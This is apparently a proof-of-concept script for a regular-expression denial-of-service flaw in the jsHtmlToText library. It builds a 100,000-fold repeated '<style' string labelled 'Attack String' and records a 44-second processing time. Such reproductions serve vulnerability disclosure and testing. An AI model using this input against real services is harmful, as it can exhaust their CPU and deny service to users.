const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"<style"*100000+">"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "<style";
}
str += ">";

var result = htmlToText(str, "");

// real    0m44.035s
// user    0m43.991s
// sys     0m0.030s